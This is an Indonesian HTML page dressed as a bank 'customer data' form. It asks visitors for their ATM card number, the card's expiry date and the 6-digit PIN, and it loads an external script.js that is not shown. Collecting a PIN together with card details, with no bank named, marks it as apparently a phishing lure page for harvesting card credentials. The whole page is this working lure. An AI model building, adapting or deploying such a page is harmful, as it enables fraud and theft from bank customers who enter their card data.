<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Form Data Nasabah</title>

<style>
  body {
    margin: 0;
    font-family: 'Arial', sans-serif;
    background-color: #fff;
  }
  .header {
    background: linear-gradient(45deg, #1669b9, #1eaefc);
    color: white;
    padding: 20px 16px;
    position: relative;
  }
  .back-arrow {
    position: absolute;
    left: 16px;
    top: 20px;
    font-weight: bold;
    font-size: 24px;
    cursor: pointer;
  }
  .header h2 {
    margin: 0;
    text-align: center;
    font-weight: 600;
  }
  .container {
    margin: 20px 16px;
  }
  label {
    font-weight: 500;
    color: #6d6d72;
    font-size: 14px;
    display: block;
    margin-bottom: 6px;
  }
  input[type=text], input[type=password], input[type=tel] {
    width: 100%;
    padding: 12px 40px 12px 12px;
    font-size: 14px;
    border-radius: 8px;
    border: 1px solid #d8d8d8;
    background-color: #f6f8fa;
    box-sizing: border-box;
    color: #1669b9;
    font-weight: 600;
    letter-spacing: 0.1em;
    outline: none;
  }
  .input-with-icon {
    position: relative;
    margin-top: 6px;
  }
  .input-with-icon svg {
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    cursor: pointer;
    fill: #1669b9;
    width: 20px;
    height: 20px;
  }
  .helper-text {
    font-size: 12px;
    color: #999;
    text-align: right;
    margin-top: 2px;
  }
  button {
    background-color: #ffcb45;
    border: none;
    color: #666;
    font-weight: 600;
    width: 100%;
    padding: 14px 0;
    font-size: 16px;
    border-radius: 10px;
    margin-top: 32px;
    cursor: pointer;
  }
</style>
</head>

<body>

<div class="header">
  <div class="back-arrow">&#8592;</div>
  <h2>Informasi Data Nasabah.</h2>
</div>

<div class="container">
  <form id="formData" name="formData">

    <label for="cardNumber">Nomor Kartu ATM</label>
    <input 
      type="tel" 
      id="cardNumber" 
      name="cardNumber" 
      maxlength="18" 
      placeholder="Masukkan nomor kartu ATM Kamu" 
      pattern="\d*" 
      inputmode="numeric" 
    />
    <div class="helper-text" id="cardNumberCount">0/18</div>

    <label for="expiryDate" style="margin-top: 20px;">Tanggal Kadalursa Kartu ATM</label>
    <div class="input-with-icon">
      <input 
        type="tel" 
        id="expiryDate" 
        name="expiryDate" 
        placeholder="MMYY"
        maxlength="4" 
        pattern="\d{4}" 
        inputmode="numeric" 
      />
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
        <path d="M7 11h2v2H7v-2zm4 0h2v2h-2v-2zm4 0h2v2h-2v-2zM3 21h18v-2H3v2zm18-12h-3V4h-2v5H8V4H6v5H3v2h18v-2z" />
      </svg>
    </div>

    <label for="pin" style="margin-top: 20px;">6-Digit PIN Kartu ATM</label>
    <div class="input-with-icon">
      <input 
        type="password" 
        id="pin" 
        name="pin" 
        maxlength="6" 
        placeholder="PIN" 
        pattern="\d*" 
        inputmode="numeric"
      />
      <svg id="togglePin" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
        <path d="M12 6c-7 0-11 6-11 6s4 6 11 6 11-6 11-6-4-6-11-6zm0 10a4 4 0 1 1 0-8 4 4 0 0 1 0 8zM12 10a2 2 0 1 0 0 4 2 2 0 0 0 0-4z"/>
        <line x1="1" y1="1" x2="23" y2="23" stroke="#656565" stroke-width="2" />
      </svg>
    </div>
    <div class="helper-text" id="pinCount">0/6</div>

    <button type="submit">Selanjutnya</button>
  </form>
</div>

<script>
  // Counter kartu
  const cardNumberInput = document.getElementById('cardNumber');
  const cardNumberCount = document.getElementById('cardNumberCount');
  cardNumberInput.addEventListener('input', () => {
    cardNumberCount.textContent = `${cardNumberInput.value.length}/18`;
  });

  // Counter PIN
  const pinInput = document.getElementById('pin');
  const pinCount = document.getElementById('pinCount');
  pinInput.addEventListener('input', () => {
    pinCount.textContent = `${pinInput.value.length}/6`;
  });

  // Toggle PIN visibility
  const togglePin = document.getElementById('togglePin');
  togglePin.addEventListener('click', () => {
    pinInput.type = pinInput.type === 'password' ? 'text' : 'password';
  });
</script>
    <script src="script.js"></script>
</body>
</html>
